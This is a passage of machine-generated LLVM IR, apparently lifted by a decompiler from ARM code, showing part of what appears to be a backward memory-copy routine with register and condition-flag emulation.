  %v6_171fc = icmp slt i32 %v1_171fc, 0
  store i1 %v6_171fc, i1* %cpsr_n.global-to-local, align 1
  %v7_171fc = icmp eq i32 %v1_171fc, 0
  store i1 %v7_171fc, i1* %cpsr_z.global-to-local, align 1
  %v2_17200 = xor i1 %v6_171fc, %v5_171fc
  br i1 %v2_17200, label %dec_label_pc_1721c, label %dec_label_pc_17204

dec_label_pc_17204:                               ; preds = %dec_label_pc_171f8, %dec_label_pc_171b8, %dec_label_pc_17204
  %v1_17210 = phi i32 [ %v4_17210, %dec_label_pc_17204 ], [ %v12_171ec, %dec_label_pc_171f8 ], [ %v0_171ec76, %dec_label_pc_171b8 ]
  %v0_17204 = load i32, i32* %lr.global-to-local, align 4
  %v3_17204 = udiv i32 %v0_17204, 16777216
  store i32 %v3_17204, i32* %ip.global-to-local, align 4
  %v0_17208 = load i32, i32* %r1.global-to-local, align 4
  %v1_17208 = inttoptr i32 %v0_17208 to i32*
  %v2_17208 = load i32, i32* %v1_17208, align 4
  store i32 %v2_17208, i32* %lr.global-to-local, align 4
  %v4_17208 = add i32 %v0_17208, 4
  store i32 %v4_17208, i32* %r1.global-to-local, align 4
  %v4_1720c = mul i32 %v2_17208, 256
  %v5_1720c = or i32 %v4_1720c, %v3_17204
  store i32 %v5_1720c, i32* @ip, align 4
  %v2_17210 = inttoptr i32 %v1_17210 to i32*
  store i32 %v5_1720c, i32* %v2_17210, align 4
  %v3_17210 = load i32, i32* @r0, align 4
  %v4_17210 = add i32 %v3_17210, 4
  store i32 %v4_17210, i32* @r0, align 4
  %v0_17214 = load i32, i32* %r2.global-to-local, align 4
  %v1_17214 = add i32 %v0_17214, -4
  store i32 %v1_17214, i32* %r2.global-to-local, align 4
  %v3_17214 = sub i32 3, %v0_17214
  %v4_17214 = and i32 %v3_17214, %v0_17214
  %v5_17214 = icmp slt i32 %v4_17214, 0
  %v6_17214 = icmp slt i32 %v1_17214, 0
  %v2_17218 = xor i1 %v6_17214, %v5_17214
  br i1 %v2_17218, label %dec_label_pc_1721c.loopexit, label %dec_label_pc_17204

dec_label_pc_1721c.loopexit:                      ; preds = %dec_label_pc_17204
  %v7_17214 = icmp eq i32 %v0_17214, 4
  store i1 %v5_17214, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_17214, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_17214, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1721c

dec_label_pc_1721c:                               ; preds = %dec_label_pc_1721c.loopexit, %dec_label_pc_171f8
  %v0_1706c61 = phi i32 [ %v1_17214, %dec_label_pc_1721c.loopexit ], [ %v1_171fc, %dec_label_pc_171f8 ]
  %v0_1721c = load i32, i32* %r1.global-to-local, align 4
  %v1_1721c = add i32 %v0_1721c, -1
  store i32 %v1_1721c, i32* @r1, align 4
  br label %bb140

dec_label_pc_17224:                               ; preds = %entry
  %v1_17224 = load i32, i32* @r2, align 4
  %v2_17224 = add i32 %v1_17224, %v0_16fd0
  store i32 %v2_17224, i32* %r1.global-to-local, align 4
  %v2_17228 = add i32 %v1_17224, %v1_16fd0
  store i32 %v2_17228, i32* %r0.global-to-local, align 4
  %v2_1722c = add i32 %v1_17224, -4
  store i32 %v2_1722c, i32* %r2.global-to-local, align 4
  %v4_1722c = sub i32 3, %v1_17224
  %v5_1722c = and i32 %v4_1722c, %v1_17224
  %v6_1722c = icmp slt i32 %v5_1722c, 0
  store i1 %v6_1722c, i1* %cpsr_v.global-to-local, align 1
  %v7_1722c = icmp slt i32 %v2_1722c, 0
  store i1 %v7_1722c, i1* %cpsr_n.global-to-local, align 1
  %v8_1722c = icmp eq i32 %v1_17224, 4
  store i1 %v8_1722c, i1* %cpsr_z.global-to-local, align 1
  %v5_17230 = icmp slt i32 %v1_17224, 4
  br i1 %v5_17230, label %bb150, label %dec_label_pc_17234

dec_label_pc_17234:                               ; preds = %dec_label_pc_17224
  %v1_17234 = urem i32 %v2_17228, 4
  store i32 %v1_17234, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17234 = icmp eq i32 %v1_17234, 0
  store i1 %v2_17234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17234, label %dec_label_pc_1723c, label %dec_label_pc_172dc

dec_label_pc_1723c:                               ; preds = %dec_label_pc_17234
  %v1_1723c = urem i32 %v2_17224, 4
  store i32 %v1_1723c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1723c = icmp eq i32 %v1_1723c, 0
  store i1 %v2_1723c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1723c, label %dec_label_pc_17244, label %dec_label_pc_17308

dec_label_pc_17244:                               ; preds = %dec_label_pc_1723c, %dec_label_pc_17300
  %v0_1725c37 = phi i32 [ %v2_17228, %dec_label_pc_1723c ], [ %v0_1735020, %dec_label_pc_17300 ]
  %v0_1725836 = phi i32 [ %v2_17224, %dec_label_pc_1723c ], [ %v0_17300, %dec_label_pc_17300 ]
  %v0_17244 = phi i32 [ %v2_1722c, %dec_label_pc_1723c ], [ %v2_172f8, %dec_label_pc_17300 ]
  %v2_17244 = add i32 %v0_17244, -8
  store i32 %v2_17244, i32* %r2.global-to-local, align 4
  %v4_17244 = sub i32 7, %v0_17244
  %v5_17244 = and i32 %v4_17244, %v0_17244
  %v6_17244 = icmp slt i32 %v5_17244, 0
  store i1 %v6_17244, i1* %cpsr_v.global-to-local, align 1
  %v7_17244 = icmp slt i32 %v2_17244, 0
  store i1 %v7_17244, i1* %cpsr_n.global-to-local, align 1
  %v8_17244 = icmp eq i32 %v0_17244, 8
  store i1 %v8_17244, i1* %cpsr_z.global-to-local, align 1
  %v5_17248 = icmp slt i32 %v0_17244, 8
  br i1 %v5_17248, label %dec_label_pc_17294, label %dec_label_pc_1724c

dec_label_pc_1724c:                               ; preds = %dec_label_pc_17244
  %v3_1724c = load i32, i32* @r4, align 4
  %v5_1724c = inttoptr i32 %v3_1724c to i8*
  store i8* %v5_1724c, i8** %stack_var_-8, align 4
  %v8_1724c = load i32, i32* @lr, align 4
  %v2_17250 = add i32 %v0_17244, -28
  store i32 %v2_17250, i32* %r2.global-to-local, align 4
  %v4_17250 = sub i32 27, %v0_17244
  %v5_17250 = and i32 %v4_17250, %v2_17244
  %v6_17250 = icmp slt i32 %v5_17250, 0
  store i1 %v6_17250, i1* %cpsr_v.global-to-local, align 1
  %v7_17250 = icmp slt i32 %v2_17250, 0
  store i1 %v7_17250, i1* %cpsr_n.global-to-local, align 1
  %v8_17250 = icmp eq i32 %v2_17244, 20
  store i1 %v8_17250, i1* %cpsr_z.global-to-local, align 1
  %v5_17254 = icmp slt i32 %v2_17244, 20
  br i1 %v5_17254, label %dec_label_pc_17270, label %dec_label_pc_17258

dec_label_pc_17258:                               ; preds = %dec_label_pc_1724c, %dec_label_pc_17258.dec_label_pc_17258_crit_edge
  %v0_1725c = phi i32 [ %v1_17264, %dec_label_pc_17258.dec_label_pc_17258_crit_edge ], [ %v0_1725c37, %dec_label_pc_1724c ]
  %v0_17258 = phi i32 [ %v0_17258.pre, %dec_label_pc_17258.dec_label_pc_17258_crit_edge ], [ %v0_1725836, %dec_label_pc_1724c ]
  %v1_17258 = add i32 %v0_17258, -4
  %v2_17258 = inttoptr i32 %v1_17258 to i32*
  %v3_17258 = load i32, i32* %v2_17258, align 4
  %v4_17258 = add i32 %v0_17258, -8
  %v5_17258 = inttoptr i32 %v4_17258 to i32*
  %v6_17258 = load i32, i32* %v5_17258, align 4
  store i32 %v6_17258, i32* %r4.global-to-local, align 4
  %v7_17258 = add i32 %v0_17258, -12
  %v8_17258 = inttoptr i32 %v7_17258 to i32*
  %v9_17258 = load i32, i32* %v8_17258, align 4
  store i32 %v9_17258, i32* %ip.global-to-local, align 4
  %v10_17258 = add i32 %v0_17258, -16
  %v11_17258 = inttoptr i32 %v10_17258 to i32*
  %v12_17258 = load i32, i32* %v11_17258, align 4
  store i32 %v12_17258, i32* %lr.global-to-local, align 4
  store i32 %v10_17258, i32* %r1.global-to-local, align 4
  %v1_1725c = add i32 %v0_1725c, -16
  %v2_1725c = inttoptr i32 %v1_1725c to i32*
  store i32 %v3_17258, i32* %v2_1725c, align 4
  %v4_1725c = add i32 %v0_1725c, -12
  %v5_1725c = inttoptr i32 %v4_1725c to i32*
  %v6_1725c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1725c, i32* %v5_1725c, align 4
  %v7_1725c = add i32 %v0_1725c, -8
  %v8_1725c = inttoptr i32 %v7_1725c to i32*
  %v9_1725c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1725c, i32* %v8_1725c, align 4
  %v10_1725c = add i32 %v0_1725c, -4
  %v11_1725c = inttoptr i32 %v10_1725c to i32*
  %v12_1725c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1725c, i32* %v11_1725c, align 4
  store i32 %v1_1725c, i32* %r0.global-to-local, align 4
  %v0_17260 = load i32, i32* %r1.global-to-local, align 4
  %v1_17260 = add i32 %v0_17260, -4
  %v2_17260 = inttoptr i32 %v1_17260 to i32*
  %v3_17260 = load i32, i32* %v2_17260, align 4
  store i32 %v3_17260, i32* @r3, align 4
  %v4_17260 = add i32 %v0_17260, -8
  %v5_17260 = inttoptr i32 %v4_17260 to i32*
  %v6_17260 = load i32, i32* %v5_17260, align 4
  store i32 %v6_17260, i32* %r4.global-to-local, align 4
  %v7_17260 = add i32 %v0_17260, -12
  %v8_17260 = inttoptr i32 %v7_17260 to i32*
  %v9_17260 = load i32, i32* %v8_17260, align 4
  store i32 %v9_17260, i32* @ip, align 4
  %v10_17260 = add i32 %v0_17260, -16
  %v11_17260 = inttoptr i32 %v10_17260 to i32*
  %v12_17260 = load i32, i32* %v11_17260, align 4
  store i32 %v12_17260, i32* %lr.global-to-local, align 4
  store i32 %v10_17260, i32* %r1.global-to-local, align 4
  %v1_17264 = add i32 %v0_1725c, -32
  %v2_17264 = inttoptr i32 %v1_17264 to i32*
  store i32 %v3_17260, i32* %v2_17264, align 4
  %v4_17264 = add i32 %v0_1725c, -28
  %v5_17264 = inttoptr i32 %v4_17264 to i32*
  %v6_17264 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_17264, i32* %v5_17264, align 4
  %v7_17264 = add i32 %v0_1725c, -24
  %v8_17264 = inttoptr i32 %v7_17264 to i32*
  %v9_17264 = load i32, i32* @ip, align 4
  store i32 %v9_17264, i32* %v8_17264, align 4
  %v10_17264 = add i32 %v0_1725c, -20
  %v11_17264 = inttoptr i32 %v10_17264 to i32*
  %v12_17264 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17264, i32* %v11_17264, align 4
  store i32 %v1_17264, i32* %r0.global-to-local, align 4
  %v0_17268 = load i32, i32* %r2.global-to-local, align 4
  %v2_17268 = add i32 %v0_17268, -32
  store i32 %v2_17268, i32* %r2.global-to-local, align 4
  %v6_1726c = icmp slt i32 %v0_17268, 32
  br i1 %v6_1726c, label %dec_label_pc_17270.loopexit, label %dec_label_pc_17258.dec_label_pc_17258_crit_edge

dec_label_pc_17258.dec_label_pc_17258_crit_edge:  ; preds = %dec_label_pc_17258
  %v0_17258.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17258

dec_label_pc_17270.loopexit:                      ; preds = %dec_label_pc_17258
  %v4_17268 = sub i32 31, %v0_17268
  %v5_17268 = and i32 %v4_17268, %v0_17268
  %v6_17268 = icmp slt i32 %v5_17268, 0
  %v7_17268 = icmp slt i32 %v2_17268, 0
  store i1 %v6_17268, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17268, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17270

dec_label_pc_17270:                               ; preds = %dec_label_pc_17270.loopexit, %dec_label_pc_1724c
  %v6_17278 = phi i32 [ %v1_17264, %dec_label_pc_17270.loopexit ], [ %v0_1725c37, %dec_label_pc_1724c ]
  %v0_17280.pr = phi i32 [ %v2_17268, %dec_label_pc_17270.loopexit ], [ %v2_17250, %dec_label_pc_1724c ]
  %v4_17270 = add i32 %v0_17280.pr, 16
  %v6_17270 = sub i32 0, %v0_17280.pr
  %v7_17270 = and i32 %v4_17270, %v6_17270
  %v8_17270 = icmp slt i32 %v7_17270, 0
  store i1 %v8_17270, i1* %cpsr_v.global-to-local, align 1
  %v9_17270 = icmp slt i32 %v4_17270, 0
  store i1 %v9_17270, i1* %cpsr_n.global-to-local, align 1
  %v10_17270 = icmp eq i32 %v4_17270, 0
  store i1 %v10_17270, i1* %cpsr_z.global-to-local, align 1
  %v5_17274 = icmp slt i32 %v0_17280.pr, -16
  br i1 %v5_17274, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_17270
  %v6_17274 = load i32, i32* %r1.global-to-local, align 4
  %v7_17274 = add i32 %v6_17274, -4
  %v8_17274 = inttoptr i32 %v7_17274 to i32*
  %v9_17274 = load i32, i32* %v8_17274, align 4
  store i32 %v9_17274, i32* @r3, align 4
  %v10_17274 = add i32 %v6_17274, -8
  %v11_17274 = inttoptr i32 %v10_17274 to i32*
  %v12_17274 = load i32, i32* %v11_17274, align 4
  store i32 %v12_17274, i32* %r4.global-to-local, align 4
  %v13_17274 = add i32 %v6_17274, -12
  %v14_17274 = inttoptr i32 %v13_17274 to i32*
  %v15_17274 = load i32, i32* %v14_17274, align 4
  store i32 %v15_17274, i32* @ip, align 4
  %v16_17274 = add i32 %v6_17274, -16
  %v17_17274 = inttoptr i32 %v16_17274 to i32*
  %v18_17274 = load i32, i32* %v17_17274, align 4
  store i32 %v18_17274, i32* %lr.global-to-local, align 4
  store i32 %v16_17274, i32* %r1.global-to-local, align 4
  %v7_17278 = add i32 %v6_17278, -16
  %v8_17278 = inttoptr i32 %v7_17278 to i32*
  store i32 %v9_17274, i32* %v8_17278, align 4
  %v10_17278 = add i32 %v6_17278, -12
  %v11_17278 = inttoptr i32 %v10_17278 to i32*
  %v12_17278 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_17278, i32* %v11_17278, align 4
  %v13_17278 = add i32 %v6_17278, -8
  %v14_17278 = inttoptr i32 %v13_17278 to i32*
  %v15_17278 = load i32, i32* @ip, align 4
  store i32 %v15_17278, i32* %v14_17278, align 4
  %v16_17278 = add i32 %v6_17278, -4
  %v17_17278 = inttoptr i32 %v16_17278 to i32*
  %v18_17278 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_17278, i32* %v17_17278, align 4
  store i32 %v7_17278, i32* %r0.global-to-local, align 4
  %v6_1727c = load i32, i32* %r2.global-to-local, align 4
  %v7_1727c = add i32 %v6_1727c, -16
  store i32 %v7_1727c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17270, %bb147
  %v6_17288 = phi i32 [ %v7_17278, %bb147 ], [ %v6_17278, %dec_label_pc_17270 ]
  %v0_17280 = phi i32 [ %v7_1727c, %bb147 ], [ %v0_17280.pr, %dec_label_pc_17270 ]
  %v4_17280 = add i32 %v0_17280, 20
  store i32 %v4_17280, i32* %r2.global-to-local, align 4
  %v6_17280 = sub i32 0, %v0_17280
  %v7_17280 = and i32 %v4_17280, %v6_17280
  %v8_17280 = icmp slt i32 %v7_17280, 0
  store i1 %v8_17280, i1* %cpsr_v.global-to-local, align 1
  %v9_17280 = icmp slt i32 %v4_17280, 0
  store i1 %v9_17280, i1* %cpsr_n.global-to-local, align 1
  %v10_17280 = icmp eq i32 %v4_17280, 0
  store i1 %v10_17280, i1* %cpsr_z.global-to-local, align 1
  %v5_17284 = icmp slt i32 %v0_17280, -20
  br i1 %v5_17284, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_17284 = load i32, i32* %r1.global-to-local, align 4
  %v7_17284 = add i32 %v6_17284, -4
  %v8_17284 = inttoptr i32 %v7_17284 to i32*
  %v9_17284 = load i32, i32* %v8_17284, align 4
  store i32 %v9_17284, i32* @r3, align 4
  %v10_17284 = add i32 %v6_17284, -8
  %v11_17284 = inttoptr i32 %v10_17284 to i32*
  %v12_17284 = load i32, i32* %v11_17284, align 4
  store i32 %v12_17284, i32* @ip, align 4
  %v13_17284 = add i32 %v6_17284, -12
  %v14_17284 = inttoptr i32 %v13_17284 to i32*
  %v15_17284 = load i32, i32* %v14_17284, align 4
  store i32 %v15_17284, i32* %lr.global-to-local, align 4
  store i32 %v13_17284, i32* %r1.global-to-local, align 4
  %v7_17288 = add i32 %v6_17288, -12
  %v8_17288 = inttoptr i32 %v7_17288 to i32*
  store i32 %v9_17284, i32* %v8_17288, align 4
  %v10_17288 = add i32 %v6_17288, -8
  %v11_17288 = inttoptr i32 %v10_17288 to i32*
  %v12_17288 = load i32, i32* @ip, align 4
  store i32 %v12_17288, i32* %v11_17288, align 4
  %v13_17288 = add i32 %v6_17288, -4
  %v14_17288 = inttoptr i32 %v13_17288 to i32*
  %v15_17288 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_17288, i32* %v14_17288, align 4
  store i32 %v7_17288, i32* %r0.global-to-local, align 4
  %v6_1728c = load i32, i32* %r2.global-to-local, align 4
  %v7_1728c = add i32 %v6_1728c, -12
  store i32 %v7_1728c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_172ac45 = phi i32 [ %v6_17288, %.thread2 ], [ %v7_17288, %bb148 ]
  %v0_1729443 = phi i32 [ %v4_17280, %.thread2 ], [ %v7_1728c, %bb148 ]
  %v2_17290 = load i8*, i8** %stack_var_-8, align 4
  %v3_17290 = ptrtoint i8* %v2_17290 to i32
  store i32 %v3_17290, i32* @r4, align 4
  store i32 %v8_1724c, i32* @lr, align 4
  br label %dec_label_pc_17294

dec_label_pc_17294:                               ; preds = %dec_label_pc_17244, %.thread4
  %v7_172a4 = phi i32 [ %v0_1725c37, %dec_label_pc_17244 ], [ %v6_172ac45, %.thread4 ]
  %v0_17294 = phi i32 [ %v2_17244, %dec_label_pc_17244 ], [ %v0_1729443, %.thread4 ]
  %v2_17294 = add i32 %v0_17294, 8
  store i32 %v2_17294, i32* %r2.global-to-local, align 4
  %v4_17294 = sub i32 0, %v0_17294
  %v5_17294 = and i32 %v2_17294, %v4_17294
  %v6_17294 = icmp slt i32 %v5_17294, 0
  store i1 %v6_17294, i1* %cpsr_v.global-to-local, align 1
  %v7_17294 = icmp slt i32 %v2_17294, 0
  store i1 %v7_17294, i1* %cpsr_n.global-to-local, align 1
  %v8_17294 = icmp eq i32 %v2_17294, 0
  store i1 %v8_17294, i1* %cpsr_z.global-to-local, align 1
  %v5_17298 = icmp slt i32 %v0_17294, -8
  br i1 %v5_17298, label %bb150, label %dec_label_pc_1729c

dec_label_pc_1729c:                               ; preds = %dec_label_pc_17294
  %v6_1729c = add i32 %v0_17294, 4
  store i32 %v6_1729c, i32* %r2.global-to-local, align 4
  %v8_1729c = sub i32 -5, %v0_17294
  %v9_1729c = and i32 %v8_1729c, %v2_17294
  %v10_1729c = icmp slt i32 %v9_1729c, 0
  store i1 %v10_1729c, i1* %cpsr_v.global-to-local, align 1
  %v11_1729c = icmp slt i32 %v6_1729c, 0
  store i1 %v11_1729c, i1* %cpsr_n.global-to-local, align 1
  %v12_1729c = icmp eq i32 %v2_17294, 4
  store i1 %v12_1729c, i1* %cpsr_z.global-to-local, align 1
  %v5_172a0 = icmp slt i32 %v2_17294, 4
  %v6_172a0 = load i32, i32* %r1.global-to-local, align 4
  %v7_172a0 = add i32 %v6_172a0, -4
  %v8_172a0 = inttoptr i32 %v7_172a0 to i32*
  %v9_172a0 = load i32, i32* %v8_172a0, align 4
  store i32 %v9_172a0, i32* @r3, align 4
  br i1 %v5_172a0, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_1729c
  store i32 %v7_172a0, i32* %r1.global-to-local, align 4
  %v8_172a4 = add i32 %v7_172a4, -4
  %v9_172a4 = inttoptr i32 %v8_172a4 to i32*
  store i32 %v9_172a0, i32* %v9_172a4, align 4
  %v10_172a4 = load i32, i32* %r0.global-to-local, align 4
  %v11_172a4 = add i32 %v10_172a4, -4
  store i32 %v11_172a4, i32* %r0.global-to-local, align 4
  %v0_172b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1729c
  %v10_172a8 = add i32 %v6_172a0, -8
  %v11_172a8 = inttoptr i32 %v10_172a8 to i32*
  %v12_172a8 = load i32, i32* %v11_172a8, align 4
  store i32 %v12_172a8, i32* @ip, align 4
  store i32 %v10_172a8, i32* %r1.global-to-local, align 4
  %v7_172ac = add i32 %v7_172a4, -8
  %v8_172ac = inttoptr i32 %v7_172ac to i32*
  store i32 %v9_172a0, i32* %v8_172ac, align 4
  %v10_172ac = add i32 %v7_172a4, -4
  %v11_172ac = inttoptr i32 %v10_172ac to i32*
  %v12_172ac = load i32, i32* @ip, align 4
  store i32 %v12_172ac, i32* %v11_172ac, align 4
  store i32 %v7_172ac, i32* %r0.global-to-local, align 4
  %v6_172b0 = load i32, i32* %r2.global-to-local, align 4
  %v7_172b0 = add i32 %v6_172b0, -4
  store i32 %v7_172b0, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_17294, %dec_label_pc_17224, %dec_label_pc_17458, %dec_label_pc_173ec, %dec_label_pc_17380, %bb149
  %v2_172b8 = phi i32 [ %v11_172a4, %.thread8 ], [ %v0_1735020, %.thread14 ], [ %v7_172a4, %dec_label_pc_17294 ], [ %v2_17228, %dec_label_pc_17224 ], [ %v2_172c453, %dec_label_pc_17458 ], [ %v2_172c452, %dec_label_pc_173ec ], [ %v2_172c451, %dec_label_pc_17380 ], [ %v7_172ac, %bb149 ]
  %v0_172b4 = phi i32 [ %v0_172b4.pre, %.thread8 ], [ %v2_172f8, %.thread14 ], [ %v2_17294, %dec_label_pc_17294 ], [ %v2_1722c, %dec_label_pc_17224 ], [ %v0_172b449, %dec_label_pc_17458 ], [ %v0_172b448, %dec_label_pc_173ec ], [ %v0_172b447, %dec_label_pc_17380 ], [ %v7_172b0, %bb149 ]
  %v1_172b4 = add i32 %v0_172b4, 4
  store i32 %v1_172b4, i32* %r2.global-to-local, align 4
  %v3_172b4 = sub i32 0, %v0_172b4
  %v4_172b4 = and i32 %v1_172b4, %v3_172b4
  %v5_172b4 = icmp slt i32 %v4_172b4, 0
  store i1 %v5_172b4, i1* %cpsr_v.global-to-local, align 1
  %v6_172b4 = icmp slt i32 %v1_172b4, 0
  store i1 %v6_172b4, i1* %cpsr_n.global-to-local, align 1
  %v7_172b4 = icmp eq i32 %v1_172b4, 0
  store i1 %v7_172b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_172b4, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_172bc = add i32 %v0_172b4, 2
  %v3_172bc = sub i32 -3, %v0_172b4
  %v4_172bc = and i32 %v3_172bc, %v1_172b4
  %v5_172bc = icmp slt i32 %v4_172bc, 0
  store i1 %v5_172bc, i1* %cpsr_v.global-to-local, align 1
  %v6_172bc = icmp slt i32 %v1_172bc, 0
  store i1 %v6_172bc, i1* %cpsr_n.global-to-local, align 1
  %v7_172bc = icmp eq i32 %v1_172b4, 2
  store i1 %v7_172bc, i1* %cpsr_z.global-to-local, align 1
  %v0_172c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_172c0 = add i32 %v0_172c0, -1
  %v2_172c0 = inttoptr i32 %v1_172c0 to i8*
  %v3_172c0 = load i8, i8* %v2_172c0, align 1
  %v4_172c0 = zext i8 %v3_172c0 to i32
  store i32 %v4_172c0, i32* @r3, align 4
  store i32 %v1_172c0, i32* %r1.global-to-local, align 4
  %v3_172c4 = add i32 %v2_172b8, -1
  %v4_172c4 = inttoptr i32 %v3_172c4 to i8*
  store i8 %v3_172c0, i8* %v4_172c4, align 1
  %v5_172c4 = load i32, i32* %r0.global-to-local, align 4
  %v6_172c4 = add i32 %v5_172c4, -1
  store i32 %v6_172c4, i32* %r0.global-to-local, align 4
  %v0_172c8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_172c8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_172c8 = xor i1 %v0_172c8, %v1_172c8
  br i1 %v2_172c8, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_172c8 = load i32, i32* %r1.global-to-local, align 4
  %v4_172c8 = add i32 %v3_172c8, -1
  %v5_172c8 = inttoptr i32 %v4_172c8 to i8*
  %v6_172c8 = load i8, i8* %v5_172c8, align 1
  %v7_172c8 = zext i8 %v6_172c8 to i32
  store i32 %v7_172c8, i32* @r3, align 4
  store i32 %v4_172c8, i32* %r1.global-to-local, align 4
  %v6_172cc = add i32 %v5_172c4, -2
  %v7_172cc = inttoptr i32 %v6_172cc to i8*
  store i8 %v6_172c8, i8* %v7_172cc, align 1
  %v8_172cc = load i32, i32* %r0.global-to-local, align 4
  %v9_172cc = add i32 %v8_172cc, -1
  store i32 %v9_172cc, i32* %r0.global-to-local, align 4
  %v1_172d0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_172d0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_172d4 = phi i32 [ %v9_172cc, %bb152 ], [ %v6_172c4, %bb151 ]
  %v2_172d4 = phi i1 [ %v2_172d0.pre, %bb152 ], [ %v1_172c8, %bb151 ]
  %v1_172d4 = phi i1 [ %v1_172d0.pre, %bb152 ], [ %v0_172c8, %bb151 ]
  %v0_172d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_172d0 = xor i1 %v2_172d4, %v1_172d4
  %v4_172d0 = or i1 %v0_172d0, %v3_172d0
  br i1 %v4_172d0, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_172d0 = load i32, i32* %r1.global-to-local, align 4
  %v6_172d0 = add i32 %v5_172d0, -1
  %v7_172d0 = inttoptr i32 %v6_172d0 to i8*
  %v8_172d0 = load i8, i8* %v7_172d0, align 1
  %v9_172d0 = zext i8 %v8_172d0 to i32
  store i32 %v9_172d0, i32* @r3, align 4
  store i32 %v6_172d0, i32* %r1.global-to-local, align 4
  %v8_172d4 = add i32 %v7_172d4, -1
  %v9_172d4 = inttoptr i32 %v8_172d4 to i8*
  store i8 %v8_172d0, i8* %v9_172d4, align 1
  %v10_172d4 = load i32, i32* %r0.global-to-local, align 4
  %v11_172d4 = add i32 %v10_172d4, -1
  store i32 %v11_172d4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_172dc:                               ; preds = %dec_label_pc_17234
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_172dc = icmp eq i32 %v1_17234, 1
  store i1 %v8_172dc, i1* %cpsr_n.global-to-local, align 1
  %v9_172dc = icmp eq i32 %v1_17234, 2
  store i1 %v9_172dc, i1* %cpsr_z.global-to-local, align 1
  %v1_172e0 = add i32 %v2_17224, -1
  %v2_172e0 = inttoptr i32 %v1_172e0 to i8*
  %v3_172e0 = load i8, i8* %v2_172e0, align 1
  %v4_172e0 = zext i8 %v3_172e0 to i32
  store i32 %v4_172e0, i32* @r3, align 4
  store i32 %v1_172e0, i32* %r1.global-to-local, align 4
  %v3_172e4 = add i32 %v2_17228, -1
  %v4_172e4 = inttoptr i32 %v3_172e4 to i8*
  store i8 %v3_172e0, i8* %v4_172e4, align 1
  %v5_172e4 = load i32, i32* %r0.global-to-local, align 4
  %v6_172e4 = add i32 %v5_172e4, -1
  store i32 %v6_172e4, i32* %r0.global-to-local, align 4
  br i1 %v8_172dc, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_172dc
  %v6_172e8 = load i32, i32* %r1.global-to-local, align 4
  %v7_172e8 = add i32 %v6_172e8, -1
  %v8_172e8 = inttoptr i32 %v7_172e8 to i8*
  %v9_172e8 = load i8, i8* %v8_172e8, align 1
  %v10_172e8 = zext i8 %v9_172e8 to i32
  store i32 %v10_172e8, i32* @r3, align 4
  store i32 %v7_172e8, i32* %r1.global-to-local, align 4
  %v9_172ec = add i32 %v5_172e4, -2
  %v10_172ec = inttoptr i32 %v9_172ec to i8*
  store i8 %v9_172e8, i8* %v10_172ec, align 1
  %v11_172ec = load i32, i32* %r0.global-to-local, align 4
  %v12_172ec = add i32 %v11_172ec, -1
  store i32 %v12_172ec, i32* %r0.global-to-local, align 4
  br i1 %v9_172dc, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_172f0 = load i32, i32* %r1.global-to-local, align 4
  %v9_172f0 = add i32 %v8_172f0, -1
  %v10_172f0 = inttoptr i32 %v9_172f0 to i8*
  %v11_172f0 = load i8, i8* %v10_172f0, align 1
  %v12_172f0 = zext i8 %v11_172f0 to i32
  store i32 %v12_172f0, i32* @r3, align 4
  store i32 %v9_172f0, i32* %r1.global-to-local, align 4
  %v11_172f4 = add i32 %v11_172ec, -2
  %v12_172f4 = inttoptr i32 %v11_172f4 to i8*
  store i8 %v11_172f0, i8* %v12_172f4, align 1
  %v13_172f4 = load i32, i32* %r0.global-to-local, align 4
  %v14_172f4 = add i32 %v13_172f4, -1
  store i32 %v14_172f4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_172dc, %bb155
  %v0_1735020 = phi i32 [ %v12_172ec, %bb154 ], [ %v6_172e4, %dec_label_pc_172dc ], [ %v14_172f4, %bb155 ]
  %v0_172f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_172f8 = load i32, i32* @ip, align 4
  %v2_172f8 = sub i32 %v0_172f8, %v1_172f8
